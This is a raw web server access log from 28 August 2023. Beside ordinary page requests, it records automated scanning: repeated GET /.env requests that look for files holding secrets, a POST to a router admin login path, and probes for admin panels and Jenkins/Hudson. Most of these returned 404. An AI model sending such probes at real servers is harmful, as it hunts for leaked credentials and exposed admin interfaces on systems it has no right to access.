139.162.84.205 - - [28/Aug/2023:16:38:54 +0000] "GET / HTTP/1.0" 200 28038 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" "-"
135.125.244.48 - - [28/Aug/2023:16:40:21 +0000] "GET /.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
135.125.244.48 - - [28/Aug/2023:16:40:21 +0000] "POST / HTTP/1.1" 200 96781 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
20.229.51.198 - - [28/Aug/2023:16:55:26 +0000] "GET /index.php HTTP/1.1" 200 95844 "-" "Go-http-client/1.1" "-"
183.136.225.5 - - [28/Aug/2023:16:56:23 +0000] "GET / HTTP/1.1" 200 95951 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0" "-"
183.136.225.5 - - [28/Aug/2023:16:56:24 +0000] "GET / HTTP/1.1" 200 96198 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE" "-"
183.136.225.5 - - [28/Aug/2023:16:56:25 +0000] "GET /favicon.ico HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE" "-"
183.136.225.5 - - [28/Aug/2023:16:56:25 +0000] "GET /robots.txt HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE" "-"
20.229.51.198 - - [28/Aug/2023:17:10:30 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
20.229.51.198 - - [28/Aug/2023:17:25:33 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
16.171.29.80 - - [28/Aug/2023:17:27:55 +0000] "GET / HTTP/1.1" 200 96218 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13C75 Safari/601.1" "-"
16.171.29.80 - - [28/Aug/2023:17:33:37 +0000] "GET / HTTP/1.1" 200 96196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" "-"
20.229.51.198 - - [28/Aug/2023:17:40:56 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
1.14.7.100 - - [28/Aug/2023:17:57:51 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
198.199.101.64 - - [28/Aug/2023:17:58:24 +0000] "GET / HTTP/1.1" 200 95823 "-" "Mozilla/5.0 zgrab/0.x" "-"
185.254.196.173 - - [28/Aug/2023:17:58:55 +0000] "GET /.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
185.254.196.173 - - [28/Aug/2023:17:58:55 +0000] "POST / HTTP/1.1" 200 96773 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
90.22.93.173 - - [28/Aug/2023:18:03:53 +0000] "HEAD /index.php HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36 Edg/99.0.1150.46" "-"
90.22.93.173 - - [28/Aug/2023:18:03:53 +0000] "HEAD /index.php HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36 Edg/99.0.1150.46" "-"
80.76.51.50 - - [28/Aug/2023:18:06:27 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 153 "http://13.127.215.254:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0" "-"
80.76.51.50 - - [28/Aug/2023:18:06:27 +0000] "" 400 0 "-" "-" "-"
40.113.118.83 - - [28/Aug/2023:18:11:29 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
192.241.196.119 - - [28/Aug/2023:18:14:14 +0000] "GET /hudson HTTP/1.1" 404 153 "-" "Mozilla/5.0 zgrab/0.x" "-"
135.125.244.48 - - [28/Aug/2023:18:17:41 +0000] "GET /.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
135.125.244.48 - - [28/Aug/2023:18:17:42 +0000] "POST / HTTP/1.1" 200 96781 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
167.172.52.0 - - [28/Aug/2023:18:26:16 +0000] "HEAD /panel/admin.php HTTP/1.1" 404 0 "-" "python-requests/2.18.4" "-"
